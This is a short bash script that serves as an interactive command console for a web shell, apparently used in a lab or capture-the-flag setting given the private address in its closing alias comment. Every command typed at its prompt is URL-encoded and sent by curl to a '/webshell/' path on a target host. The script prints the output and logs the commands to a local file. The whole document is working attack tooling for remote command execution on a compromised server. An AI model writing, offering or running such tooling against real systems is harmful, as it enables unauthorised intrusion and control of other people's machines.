#!/bin/bash
host="${1}"
port="${2}"
webshell="http://${host}:${port}/webshell/"

if [[ -z "${host}" ]]; then
	echo "Enter a host"
	exit 1
fi
if [[ -z "${port}" ]]; then
	echo "Enter a port"
	exit 1
fi

while true; do
	read -p '$ ' raw_command
	command=$(printf %s "${raw_command}" | jq -sRr @uri) # for url encoding -s read as single string, R raw mode (no json parse), -r raw output 

	response=$(curl  -s -w "%{http_code}" "${webshell}${command}")
	http_code="${response: -3}"
	body="${response%???}"

	if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
		if [[ "${http_code}" -eq 200 ]]; then
			echo "${body}"
		else
			echo "Error: HTTP status code --> ${http_code}"
		fi
	else
		echo "Error HTTP status code invalid"
	fi

	# record cd mapping
	if [[ -n "${command}"  ]]; then
		if ! grep -q  "${command}" directory-log.txt 2> /dev/null; then
			echo -e  "${command} -  $(date)" >> directory-log.txt
		fi
	fi



done

# in CLI type alias webshell='~/webshell.sh 172.16.10.10 8081'
